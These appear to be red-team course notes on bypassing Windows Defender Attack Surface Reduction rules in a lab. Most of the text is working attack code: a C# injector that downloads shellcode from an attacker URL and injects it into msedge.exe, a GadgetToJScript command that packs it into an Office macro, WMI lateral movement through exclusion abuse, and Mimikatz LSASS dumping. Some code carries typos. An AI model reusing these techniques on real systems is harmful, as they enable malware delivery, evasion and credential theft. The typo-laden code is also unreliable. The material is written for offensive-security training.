[Attack Surface Reduction](https://docs.microsoft.com/en-us/windows/security/threat-protection/microsoft-defender-atp/attack-surface-reduction) (ASR) is a set of hardening configurations which aim to mitigate common attack techniques used by threat actors.  ASR is enforced by various components of Windows Defender, such as the WdFilter driver.  ASR is therefore not available if an AV solution other than Defender is installed and registered as the primary AV provider on a computer.

*NOTE* ASR also requires that MAPS be enabled. However since this is not available in the lab environment, it can sometimes lead to unpredictable behavior where actions are not blocked when perhaps they should be. 

ASR rules can be enabled via GPO, Intune, MDM or even powershell. A full breakdown of ASR rules that are available can be found [here](https://learn.microsoft.com/en-us/defender-endpoint/attack-surface-reduction-rules-reference)

 The focus of this module will be on rules that pertain to:
- Microsoft Office and initial access vectors via macros
- Credential hardening
- Lateral movement with PsExec and WMI
The machine in the lab that was ASR enabled is Workstation 1.

## Enumerating Enabled Rules

You can rad the applied ASR configuration directly from the local registry or with the `Get-MpPreference` cmdlet if you already have access to a machine. 

The registry location is `HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Windows Defender Exploit Guard\ASR` This key has a registry value called `ExploitGuard_ASR_Rules` which can be set to 0 or 1. The rules themselves are in another folder down called `Rules`

Each rule is referenced by a GUID which can be looked up on the aforementioned ASR rules reference page. For example, `75668c1f-73b5-4cf0-bb93-3ecf5cb7cc84` is the GUID for "Block Office applications from injecting code into other processes".  Each rule can be set to 0 (disabled), 1 (block), or 2 (audit).

ASR events are logged in the Microsoft-Windows-Windows Defender/Operational event log - event ID 1121 for blocked events and 1122 for audited events.

The `Get-MpPreference` cmdlet will return the same information

You do not have to be a local admin to read these, but you do to read any custom exclusions (such as AttackSurfaceReductionRules_RuleSpecificExclusions)

Rules can also be read remotely from the `Registry.pol` file found in the gPCFileSysPath of the GPO. In this case, the path is `\\acme.corp\SYSVOL\acme.corp\Policies\{2CA2E24F-214A-43A1-A8EE-274F708807FD}\Machine\Registry.pol`.  The "correct" way to read these is with the `Parse-PolFile` cmdlet from the [GPRegistryPolicyParser module](https://www.powershellgallery.com/packages/GPRegistryPolicyParser).  However, since that is not installed by default on most systems you can usually get away with just reading it as text.

```
gc "\\acme.corp\SYSVOL\acme.corp\Policies\{2CA2E24F-214A-43A1-A8EE-274F708807FD}\Machine\Registry.pol"
```

## MS Office Rules

The three main ASR rules that impact your ability to use Office documents as a payload delivery mechanism are:
- block all office applications from creating child processes
- block win32 api calls from office macros
- block office applications from injecting code into other processes

These prevent us from running easy one-liner payloads like powershell and from injecting shellcode into other processes. Before we get onto bypasses, let's see how these restrictions manifest themselves.

As part of the initial compromise module in CRTO, students created macro-enabled documents that executed a beacon payload via powershell. The VBA looked something like this:

```
Sub AutoOpen()

  Dim Shell As Object
  Set Shell = CreateObject("wscript.shell")
  Shell.Run "powershell.exe -nop -w hidden ..."

End Sub
```

However, if we try to do something similar on workstation 1, we'll get blocked. This is the "block all office applications from creating child processes" rule. 

Win32 APIs can be called in a macro using P/Invoke. Here's an example:

```
Private Declare PtrSafe Function MessageBoxA Lib "user32.dll" (ByVal hWnd As Long, ByVal lpText As String, ByVal lpCaption As String, ByVal uType As Long) As Long

Sub Exec()
    Dim Result As Long
    Result = MessageBoxA(0, "This is a test", "Hello World", 0)
End Sub
```

If we try to run this, we'll see that it actually works. The "block Win32 API calls from Office macros" rule only steps in when we try to write document to disk.

Finally, the "block Office applications from injecting code into other processes" rule works by restricting the privileges given when obtaining a handle to a target process.  The below screenshot is an example of a call to OpenProcess, whilst this rule is disabled, requesting PROCESS_VM_OPERATION, PROCESS_VM_READ, and PROCESS_VM_WRITE access.  My "HandleEnum" tool verifies that handle 5696 does indeed have those privileges (plus PROCESS_QUERY_LIMITED_INFORMATION).

When re-enabling the rule and repeating the experiment, we see that PROCESS_VM_WRITE and PROCESS_VM_OPERATION are not present in the handle returned by the API.  This would prevent us from using this handle to perform steps such as allocating and writing to the process' memory.

Furthermore, if we do manage to create a process the returned handle does have PROCESS_ALL_ACCESS privileges, rather than it being filtered.  

We can see that the handle returned by CreateProcessA has PROCESS_ALL_ACCESS, but the handle returned by OpenProcess (for the exact same process ID) is filtered.

## Reversing ASR Exclusions

Finding custom exclusions to bypass ASR. Can do so with the wd-extract.py script. The preextracted scripts are at: `/home/attacker/wd-extracted`

To do so:
1. Take a copy of the current VDM file: `cp /mnt/c/ProgramData/Microsoft/Windows\ Defender/Definition\ Updates/Backup/mpasbase.vdm`\
2. Now run wd-extract.py specifying the input file: `python3 wd-extract.py mpasbase.vdm --decompile wd-extracted`
3. You will see a lot of .luac and .lua files, the .luac files are the original compiled versions and the .lua files are the decompiled ones that we can read. You can grep like so: `grep "Block all Office applications from creating child processes" *.lua`
4. In the lua file there is a GetMonitoredLocations definition that holds where this rule applies, we then move down until we get to GetPathExclusions

## GadgetToJscript

The next step for us is having a way to execute arbitrary code and/or Win32 APIs without relying on P/Invoke in a macro. [GadgetToJScript](https://github.com/med0x2e/GadgetToJScript) is one possible tool that we can use.  It can generate serialized gadgets from .NET (C#) code and uses an unsafe binary formatter to trigger arbitrary code execution.  These gadgets can be output in VBA format, as well as VBS and JS, which means they can be used in Office macros and other files, such as HTA.

The G2JS solution found in C:\Tools\GadgetToJscript is made of two projects, GadgetToJscript and TestAssembly. 

TestAssembly is a project DLL that will contain the malicious code we want executing inside the macro. The main GadgetToJscript project is an EXE that will do the actual transformation of the DLL into the serialized payload. 

Write a shellcode injector in the TestAssembly project:

```
namespace TestAssembly

public class Program{
public program()
{
//code execution always beings inside the class constructor
}
}
```

When the assembly goes through the formatter it will call new Program(). So put our code inside the class contstructor to execute. 

Steps to follow from here: 
1. Download the shellcode. The default SecurityProtocol configuration is SystemDefault which allows the OS to choose the best protocol and blocks any that are not considered safe. You need to explicitly set these types:
```
byte[] shellcode;

using (var client = new WebClient())
{
//make proxy aware
client.Porxy = WebRequest.GetSystemWebProxy();
client.UseDefaultCredentials = true;

//set allowed tls versions
ServicePointManager.SecurityProtocl = SecurityProtocolType.Tls12 | SecurityProtocolType.Tls13;

shellcode = client.DownloadData("https://www.infinity-bank/shellcode.bin");
};
```

2. Spawn the target process. MS Edge is excluded in the "Block all Office applications from creating child processes" ASR rule and is also a good candidate for performing outbound HTTPS connections. We can dress the command line arguments up to make it look more legitimate. 
```
var startup = new STARTUPINFO { dwFlags = 0x00000001};
startup.cb = Marshal.SizeOf(startup);

var success = CreateProcessW(
@"C:\Program Files (x86)\Microsoft\Edge\Applications\msedge.exe",
@"""C:\Program Files\(x86)\Microsoft\Edge\Applications\msedge.exe --no-startup-window --win-session-start /prefetch:5""",
IntPtr.Zero,
IntPtr.Zero,
false,
CREATION_FLAGS.CREATE_NO_WINDOW | CREATION_FLAGS.CREATE_SUSPENDED,
IntPtr.Zero,
@"C:\Program Files (x86)\Microsoft\Edge\Application",
ref startup,
out var processInfo
);
```

3. Allocate some RW memory
```
var baseAddress = VirtualAllocEx(
processInfo.hProcess,
IntPtry.Zero,
(uint)shellcode.Length,
ALLOCATION_TYPE.MEM_COMMIT | ALLOCATION_TYPE.MEM_RESERVE,
PROTECTION_FLAGS.PAGE_READWRITE
);
```

4. Copy the beacon shellcode into it
```
success = WriteProcessMemory(
processInfo.hProcess,
baseAddress,
shellcode,
(uint)shellocde.Length,
out _);
```

5. Flip the memory protection from RW to RX
```
success = VirtualProtect(
processInfo.hProcess,
baseAddress,
(uint)shellcode.Length,
PROTECTION_FLAGS.PAGE_EXECUTE_READ,
out _);
```

6. Queue the APC on the primary thread, resume it, and close the handles
```
_ = Win32.QueueUserAPC(
baseAddress,
processInfo.hThread,
IntPtr.Zero);

Win32.ResumeThread(processInfo.hThread);

Win32.CloseHandle(processInfo.hThread);
Win32.CloseHandle(processInfo.hProcess);
```

7. Build the solution in release mode, then use GadgetToJscript to generate a VBA payload from TestAssembly.dll:
```
.\GadgetToJScript\bin\Release\GadgetToJScript.exe -w vba -b -e hex -o C:\Payloads\inject -a .\TestAssembly\bin\Release\TestAssembly.dll
```

8. Copy the content of `C:\Payloads\inject.vba` into a new macro and execute it.  A Beacon should return running in msedge.exe


## Process Creations from PSExec & WMI

This rule behaves in the same fashion as the "block Office applications from creating child processes" rule.  On my extraction, the LUA script can be found in `4138.lua`.  The two monitored applications are `WmiPrvSE.exe` and `PSEXESVC.exe`.

PsExec is not an issue, and is not blocked by this rule and the jump psexec and elevate svc-exe commands will work fine in beacon. 

Although trying to move laterally with WMI you may use remote-exec in beacon or an external tool like SharpWMI will be blocked. This is because these commands always go through via WmiPrvSE. 

The easiest way to bypass this is via the command line exclusions:

```
GetCommandLineExclusions = function()
-- function num : 0_3
local l_4_0 = ".:\\\\windows\\\\ccmcache\\\\.+"
local l_4_1 = ".:\\\\windows\\\\ccm\\\\systemtemp\\\\.+"
local l_4_2 = ".:\\\\windows\\\\ccm\\\\sensorframework\\\\.+"
local l_4_3 = ".:\\\\windows\\\\ccm\\\\signedscripts\\\\.+"
local l_4_4 = "cmd[^\\s]*\\s+/c\\s+\\\"chcp\\s+65001\\s+&\\s+.:\\\\windows\\\\system32\\\\inetsrc\\\\appcmd\\.exe\\s+list[^>]+>\\s+\\\"\\\\\\\\127\\.0\\.0\\.1\\\\.\\$\\\\temp\\\\[^\\\"]+\\\"\\s+2>&1\\\""
local l_4_5 = {}
l_4_5[l_4_0] = 0
l_4_5[l_4_1] = 0
l_4_5[l_4_2] = 0
l_4_5[l_4_3] = 0
l_4_5[l_4_4] = 0
return l_4_5
end
```

The first four entries have wildcards both at the beginning and end. We just have to include :\Windows\ccmache\ appear somewhere in the command and it will run:

```
execute-assembly C:\Tools\SharpWMI\SharpWMI\bin\Release\SharpWMI.exe action=exec computername=WKSTN-1 command="C:\Windows\System32\cmd.exe /c dir C:\Windows\ccmcache\ & C:\Windows\notepad.exe"
```

Arbitrary command line arguments can be passed to a Beacon payload so that it doesn't have to be executed via cmd.exe

```
cd \\wkstrn-1\admin$
upload C:\Payloads\smb_x64.exe
execute-assembly C:\Tools\SharpWMI\SharpWMI\bin\Release\SharpWMI.exe action=exec computername=WKSTN-1 command="C:\Windows\smb_x64.exe --path C:\Windows\ccmcache\cache"
```

## Credential stealing from LSASS

The "block credential stealing from LSASS" rule works in the same way as "block Office applications from injecting code into other processes", but the only monitored process is `lsass.exe`. It functions by filtering the handle returned from OpenProcess to remove read access to the process' memory, thus preventing its content from being dumped.

As with the previous rules, it can be bypassed by ensuring Mimikatz (or your tool of choice) is running from an excluded path. This can be done by changing the spawnto.

```
spawnto x64 c:\windows\system32\mrt.exe
mimikatz !sekurlsa::logonpasswords
```

Or by injecting it into an existing excluded process.

```
ps 
mimikatz 3088 x64 sekurlsa::logonpasswords
```